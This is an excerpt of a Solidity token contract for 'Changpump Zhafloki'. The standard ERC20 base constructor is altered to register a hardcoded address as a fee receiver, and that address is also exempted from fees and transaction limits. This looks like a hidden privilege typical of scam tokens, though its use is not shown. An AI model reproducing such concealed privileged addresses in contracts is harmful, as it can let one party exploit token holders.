...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0x88f4158871FB3D5e4ca56a438D2ed519371bB385] = _marketingwallet;
    }
...
contract ChangpumpZhafloki is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Changpump Zhafloki", "ZHAFLOKI") {
        ...
        excludeFromFees(address(0x88f4158871FB3D5e4ca56a438D2ed519371bB385), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x88f4158871FB3D5e4ca56a438D2ed519371bB385), true);
